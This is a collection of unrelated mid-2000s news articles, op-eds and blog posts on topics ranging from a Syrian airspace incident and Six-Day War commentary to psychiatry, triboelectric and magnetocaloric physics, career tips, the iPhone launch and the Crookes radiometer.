Akhtari telephoned senior Syrian officials and defined the incident as an " intolerable attempt to create tension in the region . "
Syrian Report ' Defenses opened fire on Israeli aircraft overnight ' Roee Nahmias and AP Syria claims IAF aircraft ' broke sound barrier and dropped ammunition ' over open areas , Syrian military says its air defense units ' confronted ' aircraft .
IDF declines comment ; Syrian minister : Incident proves Israel not interested in peace Syria says defenses opened fire on Israeli aircraft overnight
Israel would be responsible for any escalation in the region and it must act reasonably and not cause another war . "
Earlier , the Iranian news agency IRNA reported that Akhtari turned to Syrian security sources and told them that " Iran would be ready to offer any assistance needed under the existing circumstances . "
In addition , Akhtari called on the world 's countries to demand explanations from Israel for its actions , and prevent the Jewish state from creating new conflicts in the region .
In an effort to also recruit the moderate Arab countries in the Middle East to respond to the incident , he added , " Countries with a sense of responsibility should condemn this incident and warn Israel against the recurrence of such incidents . "
Syrian Vice President Faruq al - Shara said Thursday that " this military act of provocation by Israel proves that Israel , contrary to its claims , is not working for the creation of an atmosphere that will pave the road to peace , but is working to create tension in the region .
In a meeting with Italian Foreign Minister Massimo D'Alema , al - Shara added that " the different Israeli statements prove these attempts , and do not contradict them . "
' Israel should refrain from entering Syrian airspace '
The Russian news agency RIA Novosti reported that the Russian Foreign Ministry had expressed its hope that Israel would refrain from entering Syria 's airspace again , to prevent upsetting the regional security situation .
Jordan 's King Abdullah II , who met in Amman with US Assistant Secretary of State for Near Eastern affairs David Welch , did not refer to the Syrian incident .
Abdullah told the top American official that the US must work hard to guarantee the success of an international peace conference scheduled for November .
" America must work hard to guarantee that the upcoming conference would culminate in substantial progress in the peace process , " the official Petra news agency quoted Adbullah as saying .
Lebanese Prime Minister Fouad SIniora also ignored the incident on Thursday , but urged Syria to step up its efforts to prevent arms smuggling into Lebanon , echoing a request made by the United Nations in June after it investigated security along the two countries ' shared border .
The UN resolution that ended last summer 's war between Israel and Hizbullah banned weapon transfers to the Iranian - and Syrian - backed militant group , but the Lebanese and Israeli governments have criticized alleged violations by Syria .
Let 's start with a true story .
A colleague in the US visited her grandson in a psychiatric hospital and discovered that in his first few days there he had been drugged into a stupor .
She insisted on seeing the medical staff , and three psychiatrists told her that her grandson had a bipolar disorder caused by a brain - biochemical imbalance .
Quietly , but firmly , she asked what evidence they had that there was something wrong with his brain .
They said his mood and behaviour indicated a serious problem .
She asked how they knew this was caused by brain biochemistry .
Slightly uncomfortable , they vaguely referred to research indicating that this was the case .
Much more confident now , my colleague said she knew of no studies that had ever confirmed this idea , even though it is a common assumption in the psychiatric world , and quoted studies indicating that there was nothing wrong with the brains of people with all sorts of psychiatric labels .
Sensing that they were dealing with someone who might have read the literature , they asked what she wanted .
Her grandson was quickly transferred to a unit offering talking therapies .
My colleague did n't ask the question that all patients , relatives and advocates should ask when told that a brain - biochemical problem lies at the root of someone 's low mood or strange behaviour .
She could have said : " Can I see the test results , please ? "
The truth is that , unlike all other doctors , psychiatrists do not do physical tests to confirm their diagnoses .
The reason is simple : it is not seen as necessary to prove that there is something wrong with the brains of patients diagnosed as schizophrenic , bipolar , depressed and so on .
The organic hypothesis , however , remains unproven .
All sorts of claims about the physical causes of psychological problems continue to be made in the scientific literature and popular press .
Professor David Cohen , a critic of psychiatry , has noted that almost all the substances operating within the human body have been investigated as a possible cause of schizophrenia .
This research is leaked to the press before it has been accepted in a peer - reviewed journal and " the results are likely to be cited around the world , thought they may never make it to scientific publication " .
We are also well aware of the massive conflicts of interest involved in the studies that do finally appear in the official literature .
Effective Health Care , in reviewing the newest so - called anti-psychotic medication , concluded : " Most relevant trials are undertaken by those with clear pecuniary interest in the results . "
Some conditions - alcohol - induced dementia , for example - show real signs of brain damage .
This is rare .
To date , studies have failed to demonstrate that people with the commonest psychiatric diagnoses have a brain - biochemical imbalance .
The studies on all the main diagnostic categories of psychiatry are plagued by a significant problem : the people being tested have almost always already received psychotropic medication , so if there is a blood , brain or liver disorder , this may have been caused by the treatment .
Physical tests on people diagnosed , but not yet treated , in the psychiatric system , would be the only way to find out if there were a difference between these people and the general public .
This never happens , as most people first encounter a GP who , instead of asking for blood and other tests to demonstrate a psychiatric condition , simply prescribes a psychotropic drug or refers on to a psychiatrist .
Psychiatrists , of course , do ask for tests such as CT scans on their patients , but these are to exclude the possibility of brain damage .
In other words , they are checking to see if there is a real brain problem , evidence of illegal drug use or whatever .
Once they have concluded that there is nothing demonstrably amiss with the patient 's brain or biochemistry , they tell the person that they have a condition that results from a biochemical problem .
But they do n't have a test that could prove a so - called mental illness was actually organic in origin .
That 's why patients are not offered tests of brain chemistry .
Imagine the same situation in oncology : you are told that you look like you have cancer , offered no tests , and told you will have two operations , followed by radiotherapy and a course of drugs that makes your hair fall out .
The idea is preposterous .
You demand proof of your condition .
An x-ray , a CT scan and blood and liver tests reveal that the diagnosis was accurate .
Reassured , though still very scared , you agree to the treatment .
So next time you are told that a psychiatric condition is due to a brain - biochemical imbalance , ask if you can see the test results .

This week marks the 40th anniversary of the end of the Six - Day War , when Israel successfully defended itself against the existential threat of a combined Arab attack .
This changed the face of the Middle East significantly , providing Israel with a sense of permanency in the region and opening the possibility for peace .
After the war , Israeli Foreign Minister Abba Eban held out his hand in peace to the Arab world and said , “ We are prepared to be unbelievably generous in working out peace terms ; everything is negotiable . ”
Unfortunately , the Israeli olive branch of peace was met with an uncompromising Arab rejection .
Forty years have passed since that monumental event in 1967 , 40 years of bloodshed and missed opportunities .
Peace between Israelis and Palestinians – and the Arab states in general – remains an elusive dream .
Today , it is disheartening to see protests of the anniversary of this war happening around the world , including here in Denver .
Palestinian supporters lament the war ’s results and advocate for an “ end to the occupation . ”
But at the conclusion of the Six - Day War , Israel immediately offered to exchange the land for peace .
The Arab nations at the time united to declare : no recognition of Israel , no negotiations , no peace .
Last September , I visited Israel shortly after the cease - fire with Hezbollah .
I spoke with many Israelis to get their view about the ongoing violence .
Former Denver residents Don and Ellie Saliman live near Gaza .
They have witnessed many rockets falling into their community in the last three years .
When Israel turned over the Gaza Strip to the Palestinians in another peace attempt , Don reported , “ It just enabled them [ the Palestinians ] to shoot their rockets further than they used to do . ”
Laya Jackson and her family moved to Tzfat , Israel , from Denver 10 years ago .
They had to stay in a bomb shelter , along with 15 neighborhood children , for nearly 30 days .
The shelter was a small , concrete room no larger than a storage unit .
Parents told me heartbreaking stories about how little boys tried to be strong and little girls cried .
Yet , once again , the tragic circumstances did not break the families I met in northern Israel .
They planned to remain in their homes and continue with life as normal .
Israelis are peaceful people who want to live happy lives , who want their children to be safe and have opportunities .
They are not the angry war - mongers that many try to portray .
Palestinian supporters cry “ end the occupation . ”
But they overlook the fact that Israel has withdrawn from Gaza , and that the Palestinians squandered the opportunity to govern themselves and build a better future when they elected a known terrorist organization as their leader .
The Palestinians free of “ occupation ” have devolved into sectarian violence and are on the verge of civil war between Islamic groups , tribal clans , and secularist forces .
Prime Minister Ehud Olmert has stated his willingness to negotiate with Hamas , as long as the group renounces violence , accepts previous agreements signed between Israel and the Palestinian Authority , and recognizes Israel ’s right to exist .
Israelis have come to realize that there are no short - cuts to a two - state solution , and that only honest negotiations , based on mutual recognition , will lead to peace .
Peace and normalcy between Israel and the Arab world is indeed attainable .
In 1977 , Egyptian President Anwar Sadat extended the first olive branch from the Arab world .
He traveled to Jerusalem and , in an address to the Knesset , delivered the following words : “ We used to reject you .
We had our reasons and our fears , yes … .
As we really and truly seek peace , we really and truly welcome you to live among us in peace and security . ”
Two years later , Israel and Egypt signed a peace treaty where Israel ceded the Sinai in exchange for peace .
As we commemorate the 40th anniversary of the Six - Day War , let us hope that the Palestinians , Syrians and other parties will soon take this crucial first step and publicly accept Israel so that further opportunities toward a just and lasting peace will not be missed .

I 've been influenced by Julia Cameron 's " Artist 's Way " and also Philip Sylvester at the Drawing Studio -- but I feel like I 'm really beginning to get a grip of my own on the creative process and wanted to take some quick notes .
Quality through quantity .
Do n't get hung up on making this one piece good -- make ten and one will certainly be pretty good .
Do NOT mix generating and editing .
When you 're making a piece , do n't stop and get judgmental half - way through .
If it 's a piece of crap , get that piece of crap out of your system -- do n't try to fix it mid-flow .
Finish it , move on .
When to judge :
After you 've completed a piece , look at it and decide what direction you want to go in next .
Or if you 're selecting pieces for submission to a show , apply your critiquing mind then .
Make a piece of art ; look at it ; make another .
Do n't be afraid to re-use elements .
If each piece has to be unique , then you 're going to get hung - up when you create some bit that you like .
But if you can re-use bits , then you can keep moving .
How to have " lots of ideas " : permute .
Start anywhere .
Once a piece is done , try varying some aspect .
Think of all the variables that could have permutations .
" Get through your first 50 failures as fast as you can . "
I do n't think that we should be shooting for a place where we no longer make crappy art .
A good artist is one who 's in motion making lots of art -- you only think they 're so much better because they produce so much quantity that their pile of " good art " has also been able to accumulate .
For every piece of crap you create , you 're one step closer to getting something you really like .
Do n't even bother " fixing " pieces .
Making art should n't be a struggle .
You 're simply " thinking out loud " onto the page , photo - paper , or canvas .
If a product seems confused , leave it confused .
Make another piece where you contemplate whatever issues you were wrestling with .
Try something different .
When clarity arrives , it will come in one living piece -- not be Frankensteined together out of a single infinitely re-worked , mangled corpse .
Work fast .
Creativity is exciting .
If you 're not judging while you 're making , then you can just throw things together as fast as your mind can move .
You 're smart ; if you do n't like what you 've made , you 'll know immediately .
You might not know what to do about the problem you perceive ...
Do n't " think " , standing there cogitating -- try things .
If your hands are in motion , you can be generating new permutations .
The one that you want to pick will come out on its own time .
Let your level show .
Let the world know that despite having years of investment in your art form , you 're still a beginner who does n't know it all .
Rather than hide your thought process , let your questions be present in your work .
You are a fundamentally more interesting artist if people get to see what it is that you 're struggling with , rather than just your final answers .
Show your work .
Talk about what you still can't understand ( unapologetically ) .
by Robert Schmidt
July 19 ( Bloomberg ) — House Democrats , escalating a battle with the White House , took the first step in seeking to hold President George W. Bush ’s chief of staff in contempt of Congress for defying a subpoena requesting documents on the firing of eight U.S. prosecutors .
Voting 7 - 3 along party lines , a House Judiciary subcommittee approved a resolution rejecting executive privilege claims made by Joshua Bolten in refusing to turn over e-mails and memos on the firings .
The panel adopted a similar measure last week after ex-White House Counsel Harriet Miers declined to testify about the dismissals .
Bolten was subpoenaed in June because as chief of staff he is the custodian of the White House ’s records .
The next step for the panel would be to vote on a contempt resolution .
If that is adopted by the full House , the U.S. attorney in Washington , a Bush appointee , would be asked to pursue a prosecution .

In approximately 600 B.C. , the Greek philosopher Thales of Miletos discovered that rubbing certain materials together , such as amber and wool , can cause both to become electrically charged , one positive and one negative .
This phenomenon is useful for several industrial processes , including printing and filtration , and has sparked much interest and study .
Still , scientists cannot fully explain how rubbing - induced charge transfer occurs or how that transfer affects surrounding objects .
Scientists at Rutgers University have recently completed an experiment designed to help illuminate the phenomenon ( known as the triboelectric effect ) – but that initially left them scratching their heads instead .
In the July 31 , 2007 , online edition of Physical Review Letters , they describe their experiment : separating a mixture of red and blue “ art - sand ” particles by pouring them into a positively charged acrylic cylinder using a miniature version of a “ vibratory feeder , ” a machine typically used to move dry goods from storage hoppers into processing machines .
The scientists charged the cylinder triboelectrically by rubbing it with a nylon glove .
Based on this initial condition , they expected to the grains to exhibit certain behaviors .
As the grains traveled down the feeder , they became positively charged due to friction .
When they reached the end and fell through the air , they cleanly separated into two streams – one red and one blue – and formed two piles on the bottom of the cylinder .
The experiment is similar to one performed in the 19th century by British physicist Lord Kelvin , who noticed that a charged stream of water droplets induced a charge in a second water - droplet stream positioned next to it .
Due to the slightly different chemical composition of the grains , the blue grains pick up slightly more positive charge than the red .
The scientists assumed , based on the law of electrostatics , that each positively charged blue grain would induce a negative charge on the metal feeder .
Accordingly , they reasoned that because the blue grains have more positive charge , they would feel a stronger pull toward the feeder than the red and fall as close to the feeder as possible .
Oddly , the opposite behavior occurred :
The red grains fell closer to the feeder .
Upon examining the feeder , the group noticed that a small beard of red grains , perhaps five or 10 grains thick , had built up on the feeder lip .
This was also odd , since the blue grains carry more positive charge and were more likely to stick .
Further , no blue grains stuck to the beard , but rather , as the scientists write , a “ paradoxical repulsion ” took place .
The blue grains glided over the red and over the edge .
Thus , the two colors separated before they fell .
It appears , therefore , that the positive charge on the cylinder did not influence the grains ' behavior .
Fernando Muzzio , a scientist involved in the study , told PhysOrg.com that he and his colleagues had also subjected some “ real - world ” materials to the same experimental setup , including typical pharmaceutical powders , which have the potential to experience these triboelectric - induced issues during processing .
The group observed essentially the same results .
“ I suspect that once we start looking , we will find similar unexpected behaviors in many places .
It remains for future study to determine the extent to which these phenomena can be controlled to avoid quality problems , or even better , to develop new methods of processing , ” Muzzio said .

BANNED in Pittsburgh ?
Controversy over a new advertising campaign by Trojan , the condom maker , has trickled down to the local level , with television stations in Pittsburgh roundly refusing to show it , and stations in Seattle giving it the green light .
When Trojan introduced the condom commercial last month , it was rejected as national advertising by both CBS and Fox .
Fox said it objected to the message that condoms can prevent pregnancy , while CBS said it was not “ appropriate , ” drawing a firestorm of criticism from public health advocates and bloggers .
But Trojan , which is owned by Church & Dwight , was in for more unhappy surprises last week .
Local affiliates in Pittsburgh for ABC and NBC , two networks that had agreed to run the ad nationally , also snubbed it .
The odd effect of these decisions will be that viewers in the Pittsburgh area will be able to see the commercials during national advertising slots on ABC or NBC — if with less frequency .
Stations sell their own commercial slots as well , to local and national advertisers , and the ads are subject to local review even if they pass muster with networks .
“ People are not going to forget about this for at least this Christmas season , ” he said .
Sue Dennison , co-owner of Roy Toy , which is based in East Machias , Me. , said orders were up about 25 percent over the last several weeks .
“ I used to get probably two e-mails a week inquiring about U.S. - made toys , ” she said .
“ Now I ’m getting four or five a day . ”

Ms. Dennison said her company did not use paint on its wooden toys but uses dyes that are approved for use on food .
With so many mass - produced toys being made in China , most American - made toys are sold over the Internet or in independent toy stores that tend to be more expensive than major retail chains .
Indeed , many neighborhood toy stores promote the fact that their toys are not mass produced but rather handmade by American manufacturers or imported from European toy makers .
But those stores represent a small fraction of the toys that are sold .
Cliff Annicelli , editor of Playthings , a toy industry trade publication , estimated that specialty toys represent about 5 percent of the overall toy business in the United States , which was $ 22 billion in 2006 .
He pointed out that even small toy stores may carry as many Chinese - made toys as larger retailers .
Store owners , however , are likely to have better knowledge about the quality and origin of their toys than employees of large retail chains .
At Kidding Around , a toy store in Manhattan , Karla Perez , the manager , said the recalls of Chinese - made toys have had little impact on the store ’s business .
She said her store has a loyal customer base and does not necessarily draw those who shop at retail chains like Toys “ R ” Us .
No .
It 's not selling out .
It 's making a smart , strategic move .

I do n't know the details of the contract , but from Graham 's statement at TH and the press release in my inbox , I got the impression that TH will maintain control over a lot of the content and will help shape the online community for Planet Green For Discovery it means that they do n't have to reinvent the wheel .
Like when Google bought You Tube .
Google tried video , but they sucked at it .
They realized You Tube had a good thing going - and well , if you can't beat 'em ....
Many media outlets and others who are trying to capitalize on the green wave are having a hard time catching up and making inroads in an increasingly saturated community .
The Discovery acquisition of TH will benefit both parties and will create an opportunity for the TH message to move beyond the enviro - niche and onto the masses .
After all , is n't that the goal ?
Will things change at TH ?
Sure they will .
Will everyone like it ?
Probably not .
I say : Congratulations to Graham and the TH team .

Most career advice you receive focuses on the big picture : how to get ahead , how to “ win , ” and such things that are on a much larger scale than the daily grind that most of us face .
In fact , it is that day to day grind that pulls down many of us – we go to work , come home exhausted , and often feel as though we ’re just spinning our wheels .
If you want to get ahead in your career and in your life , you need to start small and look at the immediate things you can do to help out your situation .
If you ’re sitting out there at your desk , tiredly wondering if there ’s something better that you can be doing with your life , start with these fifteen tips that you can start executing immediately that will lead you down a path towards a better career .
Fifteen Tips to Improve Your Career
Make a list of all of the things you did today / this week / this month
Whenever you have a few spare moments , make a list of all of the things you are actually doing at work .
Date them and provide specific examples .
When you ’ve made this list , drop it in a folder and let it sit there until your next performance review – or the next time you ask for a raise or a promotion .
I do this regularly , which has allowed me to build up extensive positive documentation about my career .
Send a thank - you note
If you ’ve recently been assisted in your career or personal development by someone , spend a few moments and send that person a handwritten thank you note .
The respect , kindness , and personal touch of a handwritten thank you creates an indelible positive mark in your favor in the recipient ’s mind , which can do nothing but help you out in the long run .
Work on your writing skills
For me , The Simple Dollar is actually an active part of improving my own writing .
Starting a blog related to a work - related topic that interests you is a good way to practice your skills .
Do n’t be lazy with it , though ; focus on writing strong material that will engage others , because without it , you ’re not really improving your skills at all , merely regurgitating facts .
Design some classy business cards for you
I have a small pile of business cards that are just for me ( actually , they ’re for The Simple Dollar ) , not for any firm I represent or work for or anything else .
I drop these regularly , as envelope enclosures and in face - to - face opportunities .
These cards are a reflection of me and what I wish to represent to people , and by getting quality ones , I create a positive impression on the recipients .
Do n’t go for the office store perforated ones , either ; get them professionally done and in a high quality .
Send a quick contact email
Got any professional contacts that you have n’t touched base with recently ?
Send them an email letting them know what you ’re up to – and ask them what they ’re up to .
By this , I do n’t mean clients – I mean professional acquaintances in the same field as you ( contacting clients should be a regular part of your workflow ) .
A quick email to the people you met at conferences last year can be a very good thing , as you never know if they might have a great opportunity available that could really help you out .
Suggest a solution to a persistent workplace problem
This is especially true for smaller things , not necessarily big enterprise - wide issues .
Are people always complaining about the printers ?
Spec out an additional printer and ship a proposal for a new printer by your boss .
Workplace tensions between two people ?
Figure out how to most discreetly move them far apart from each other , write it up , and ship it off .
The key is to make the solution as complete as possible , so that the boss can tell you saw a problem , looked into how to solve it , and came up with a solution on your own .
Pick up the phone and make a call
Keep in touch with what ’s going on in the organization as a whole so you can be more informed when meetings occur .
Pick up the phone and give someone else a call to see what you can learn , or take a stroll through different parts of the workplace to find out what others are up to .
Do n’t make a nuisance of yourself , but be aware of what is going on , how it can affect you , and how you might be able to leverage that to get ahead .
Work on your language skills
Are you a non-native speaker of the language in your workplace ?
Spend your spare time working on the finer points .
I find that listening to audiobooks and podcasts is an incredible way to pick up on the nuances of a language given that you already know the basics .
If you do n’t know the basics , seek out some audio courses on that language and get started .
For myself , I ’ve found that a great way to pick up a foreign language is to read a translation of a work I ’m already very familiar with , such as Harry Potter .
Make yourself more presentable
It always helps to have a clean , fresh impression .
I keep a few hygiene products in my traveling bag at all times : underarm deodorant , toothpaste , a toothbrush , some mouthwash , some facial cleanser , a comb , and some cologne .
I make sure to clean myself up at least once a day , and often twice a day , when I have a few free moments .
That way , I look freshly scrubbed at the 3:30 PM meeting – and having just washed my face vigorously , I feel more awake .
Polish your resume
There ’s never a bad time to give your resume a bit of a touch up .
Make sure it has plenty of action words and documents specific results that you ’ve produced .
In fact , your personal work documentation is a great way to look for ideas to spiff up your resume .
Read on topics you plan to be facing in the future in your career
Do n’t waste your time reading PerezHilton ( unless you work for People magazine or something ) ; instead , find resources that are related to your job and focus on those .
If you spend your spare time at work browsing the web , at least spend that time browsing items that can potentially further your career .
Prepare some comments in advance for your next meeting
Got a meeting later ?
Instead of dreading it , look at it as an opportunity to shine .
Look at what the meeting agenda is and prepare some notes and thoughts that you can present during them .
If you ’re going to sit through someone ’s presentation , find out what it ’s going to be about and do some preparatory legwork in advance so you can ask a few astute questions .
Work on your public speaking skills
This seems like it would be difficult to do right now , but it ’s not .
Merely listen to the work of great public speakers on the internet , burn yourself a CD or two of speeches that really inspire you , then play them in your car on the way home and practice speaking along with them .
You ’ll learn a great deal about how to enunciate words to get your points across and influence others .
Clean your work area
Not only will this create a better impression of you in the eyes of others , you may also come across important materials that you thought were missing or lost .
It ’s also good to start ( or enhance ) a document filing system when you do this , so you can quickly find materials .
Figure out where you want to be in five years – and create a plan for getting there
Spend some time visualizing where you want to be , then think about what it ’s going to take to get there .
From there , keep breaking down each piece in the process until the pieces are things you can do quickly – and start doing them .
Every mountain climb is just a series of steps , after all .
Researchers at the University of Cambridge have discovered a material that gives a whole new complexion to the term ' fridge magnet ' .
When this alloy is placed in a magnetic field , it gets colder .
Karl Sandeman and his co-workers think that their material - a blend of cobalt , manganese , silicon and germanium - could help to usher in a new type of refrigerator that is up to 40 percent more energy - efficient than conventional models .
Given how much energy is consumed by domestic and industrial refrigeration , that could have a significant environmental payoff .
Sandeman describes the work at the Institute of Physics Condensed Matter and Materials Physics conference at the University of Exeter , on Friday 21 April .
The ' magnetic fridge ' envisaged by the Cambridge team would use a phenomenon called the magnetocaloric effect ( MCE ) , whereby a magnetic field causes certain materials to get warmer ( a positive MCE ) or cooler ( a negative MCE ) .
Although the effect was discovered more than 120 years ago , it is only recently that magnetocaloric materials have been known with the right properties for use in everyday refrigeration .
But several factors have so far prevented such applications .
For one thing , some of the materials - typically metal alloys - that show the strongest MCE contain the element gadolinium , which is very expensive .
And some of the best potential alternatives contain arsenic , raising health concerns .
Sandeman and colleagues have now found a material that is neither toxic nor costly , and which generates significant cooling at around room temperature .
The key to the magnetocaloric behaviour is a sudden change in the magnetic state of the compound - a so - called magnetic transition .
The material is magnetic because it contains metal atoms that themselves act like tiny bar magnets .
As it is warmed up from subzero temperatures , there comes a point where these atomic magnets abruptly change the way in which they are lined up .
This switch occurs at different temperatures when the material is placed in a magnetic field .
So applying such a field can trigger the magnetic transition , and the resulting realignment of atomic magnets can then cause the material to lose heat and become colder - in other words , it shows a negative MCE .
Such a material could act as a heat pump for refrigeration .
Applying the magnetic field triggers cooling ; then the field is switched off and the material absorbs heat from its surroundings , cooling them down .
Once that has happened , the field is switched on again and the cycle repeats , each time sucking more heat from the surroundings .
Sandeman and colleagues say that their new magnetocaloric material is particularly attractive because it can be tuned - depending on the strength of the applied magnetic field , as well as the way the substance is synthesized - to work over a wide temperature range , making it potentially suitable not just for a kitchen fridge working at room temperature but for other cooling applications at higher or lower temperatures .
The Cambridge team are now developing a spin - off company , Camfridge Ltd , to bring their new materials system to real applications .

Some were boasting from their camps outside Apple stores before the iPhone rush began , of how much money they would make on eBay auctions ; and apparently , at least one optimist let it be known that $ 2,000 would be needed to buy a $ 600 iPhone .
According to Katie Hafner , stringer for the New York Times , " Thousands of listings showed up on eBay and Craigslist , with prices of $ 1,000 for the 8 - gigabyte phone , a $ 400 markup . "
Hafner found some asking even more ; " As it became clear that supply was meeting demand , they found themselves stuck .
Few of the phones have sold for more than $ 700 , which after sales tax , is not a remarkable profit margin . "
Word in the channel suggests that the " million sold " announcement is close .
There are a million handsets on their way to stores , or maybe even bought , said one insider this weekend , " but there are still problems getting them home , and registering them on the network . "
Stocks have been reaching the stores , reported Phil Lattimore , and shortages even in Texas and California should ease this week .
Up till the 5th , Engadget was still reporting " sold out " signs at all stores except Tigard , Oregon or Pittsburgh PA , but the next day , news emerged of substantial new shipments .
The real figures for sales so far vary widely .
Financial analysts ( normally with good access to channel figures ) were still saying " 500,000 to 700,000 sold " Thursday , but by Friday , there were reports " leaked from ATT Mobility " saying that the network " has fulfilled over 1 million iPhone activations since the device was launched in the US on June 29th .
" This news comes from a full - time staffer in ATT Mobilty ’s Commerce Group who chose to remain anonymous , " said one of the new iPhone web sites , " WaitingForiPhone "

How does a light - mill work ?
In 1873 , while investigating infrared radiation and the element thallium , the eminent Victorian experimenter Sir William Crookes developed a special kind of radiometer , an instrument for measuring radiant energy of heat and light .
Crookes 's Radiometer is today marketed as a conversation piece called a light - mill or solar engine .
It consists of four vanes , each of which is blackened on one side and silvered on the other .
These are attached to the arms of a rotor which is balanced on a vertical support in such a way that it can turn with very little friction .
The mechanism is encased inside a clear glass bulb that has been pumped out to a high , but not perfect , vacuum .
When sunlight falls on the light - mill , the vanes turn with the black surfaces apparently being pushed away by the light .
Crookes at first believed this demonstrated that light radiation pressure on the black vanes was turning it around , just like water in a water mill .
His paper reporting the device was refereed by James Clerk Maxwell , who accepted the explanation Crookes gave .
It seems that Maxwell was delighted to see a demonstration of the effect of radiation pressure as predicted by his theory of electromagnetism .
But there is a problem with this explanation .
Light falling on the black side should be absorbed , while light falling on the silver side of the vanes should be reflected .
The net result is that there is twice as much radiation pressure on the metal side as on the black .
In that case the mill is turning the wrong way .
When this was realised , other explanations for the radiometer effect were sought and some that people came up with are still mistakenly quoted as correct .
It was clear that the black side of each vane would absorb heat from infrared radiation more than the silver side .
This would cause the rarefied gas to be heated on the black side .
In that case , the obvious explanation is that the pressure of the gas on the darker side increases with its temperature , creating a higher force on the dark side of the vane which thus pushes the rotor around .
Maxwell analysed this theory carefully — presumably being wary about making a second mistake .
He discovered that , in fact , the warmer gas would simply expand in such a way that there would be no net force from this effect , just a steady flow of heat across the vanes .
So this explanation in terms of warm gas is wrong , but even the Encyclopaedia Britannica gives this false explanation today .
A variation on this theme is that the motion of the hot molecules on the black side of the vane provide the push .
Again this is not correct , and could only work if the mean free path between molecular collisions were as large as the container , instead of its actual value of typically less than a millimetre .
To understand why these common explanations are wrong , think first of a simpler setup in which a tube of gas is kept hot at one end and cool at the other .
If the gas behaves according to the ideal gas laws with isotropic pressure , it will settle into a steady state with a temperature gradient along the tube .
The pressure will be the same throughout , since otherwise net forces will disturb the gas .
The density will vary inversely with temperature along the tube .
There will be a flow of heat from the hot end to the cold end , but the force on both ends will be the same because the pressures at the ends are equal .
Any suggested mechanism that yields a stronger force on the hot end with no tangential forces along the length of the tube cannot be correct , since otherwise there would be a net force on the tube with no opposite reaction .
The radiometer is a little more complex , but the same idea should apply .
No net force can be generated by normal forces on the faces of the vanes , because pressure would quickly equalise to a steady state with just a flow of heat through the gas .
Another blind alley was the theory that the heat vaporises gases dissolved in the black coating , which then leak out and propel the vanes round .
Actually , such an effect does exist ; but it is not the real explanation .
This can be demonstrated by cooling the radiometer , for then the rotor turns the other way .
Furthermore , if the gas is pumped out to make a much higher vacuum , the vanes stop turning altogether .
This suggests that the rarefied gas is involved in the effect .
For similar reasons , the theory that the vanes are propelled by electrons dislodged via the photoelectric effect can also be ruled out .
One last incorrect explanation sometimes given is that the heating sets up convection currents with a horizontal component that turns the vanes .
Sorry , wrong again .
The effect cannot be explained in this way .
The correct solution to the problem was provided qualitatively by Osborne Reynolds , better remembered for the " Reynolds number " .
Early in 1879 Reynolds submitted a paper to the Royal Society in which he considered what he called " thermal transpiration " , and also discussed the theory of the radiometer .
By " thermal transpiration " , Reynolds meant the flow of gas through porous plates caused by a temperature difference on the two sides of the plates .
If the gas is initially at the same pressure on the two sides , it flows from the colder to the hotter side , resulting in a higher pressure on the hotter side if the plates cannot move .
Equilibrium is reached when the ratio of pressures on either side is the square root of the ratio of absolute temperatures .
This counterintuitive result is due to tangential forces between the gas molecules and the sides of the narrow pores in the plates .
The effect of these thermomolecular forces is very similar to the thermomechanical effects of superfluid liquid helium .
This liquid , which lacks all viscosity , will climb the sides of its container towards a warmer region .
In fact , this form of liquid helium climbs so quickly up the sides of a thin capillary tube dipped into it , that a fountain is produced at the tube 's other end .
The vanes of a radiometer are not porous .
To explain the radiometer , therefore , one must focus attention not on the faces of the vanes , but on their edges .
The faster molecules from the warmer side strike the edges obliquely and impart a higher force than the colder molecules .
Again , these are the same thermomolecular forces responsible for Reynolds ' thermal transpiration .
The effect is also known as thermal creep , since it causes gases to creep along a surface that has a temperature gradient .
The net movement of the vane due to the tangential forces around the edges is away from the warmer gas and towards the cooler gas , with the gas passing around the edge in the opposite direction .
The behaviour is just as if there were a greater force on the blackened side of the vane ( which as Maxwell showed is not the case ) ; but the explanation must be in terms of what happens not at the faces of the vanes , but near their edges .
Maxwell refereed Reynolds ' paper , and so became aware of his suggestion .
Maxwell at once made a detailed mathematical analysis of the problem , and submitted his own paper , " On stresses in rarefied gases arising from inequalities of temperature " , for publication in the Philosophical Transactions ; it appeared in 1879 , shortly before his death .
The paper gave due credit to Reynolds ' suggestion that the effect is at the edges of the vanes , but criticised Reynolds ' mathematical treatment .
Reynolds ' paper had not yet appeared ( it was published in 1881 ) , and Reynolds was incensed by the fact that Maxwell 's paper had not only appeared first , but had criticised his unpublished work !
Reynolds wanted his protest to be published by the Royal Society , but after Maxwell 's death this was deemed inappropriate .
On a last note , it is possible to measure radiation pressure using a more refined apparatus .
One needs to use a much better vacuum , suspend the vanes from fine fibers and coat the vanes with an inert glass to prevent out - gassing .
When this is done , the vanes are deflected the other way &mdash as predicted by Maxwell .
The experiment is very difficult ; it was first done successfully in 1901 by Pyotr Lebedev and also by Ernest Nichols and Gordon Hull .

Exercise stimulates the growth of new brain cells , a new study on rats finds .
The new cells could be the key to why working out relieves depression .
Previous research showed physical exercise can have antidepressant effects , but until now scientists did n’t fully understand how it worked .
Astrid Bjornebekk of the Karolinska Institute in Sweden and her colleagues studied rats that had been genetically tweaked to show depressive behaviors , plus a second group of control rats .
For 30 days , some of the rats had free access to running wheels and others did not .
Then , to figure out if running turned the down - and - out rats into happy campers , the scientists used a standard “ swim test . ”
They measured the amount of time the rats spent immobile in the water and the time they spent swimming around in active mode .
When depressed , rats spend most of the time not moving .
“ In the depressed rats , running had an antidepressant - like effect after running for 30 days , ” Bjornebekk told LiveScience .
The once - slothful rodents spent much more time in active swimming compared with the non-running depressed rats .
The researchers also examined the hippocampus region of the brain , involved in learning and memory .
Neurons there increased dramatically in the depressed rats after wheel - running .
Past studies have found that the human brain ’s hippocampus shrinks in depressed individuals , a phenomenon thought to cause some of the mental problems often linked with depression .
“ The hippocampus formation is one of the regions they have actually seen structural changes in depressed patients , ” Bjornebekk said .
Running had a similar effect as common antidepressants called selective serotonin reuptake inhibitors ( SSRIs ) on lifting depression .
The research is published in the International Journal of Neuropsychopharmacology .
Related News Norway sees increased Russian military activity along its coast Comment Tell A Friend Print Format Save Article Norway 's Defense Ministry has stepped up its patrol of the northern coastal region after Russia dispatched more bombers to join training missions close to that area last week , reports reaching here said Monday .
" We have strengthened our preparedness in the north , and sent extra fighter jets to Bodo , " Norwegian State Secretary Espen Barth Eide told Aftenposten newspaper .
His comments came after more Russian bombers were spotted off the Norwegian coast Friday .
Norwegian fighter jets were sent out several times to monitor the Russian flights , to make sure that they stayed out of the Norwegian territory .
Norwegians view the Russian training exercises as a power play .
" Russia wants to make it clear that we should view them as a superpower , " Barth Eide said .
" At the same time , they want to prove that they have the resources to carry out such exercises . "
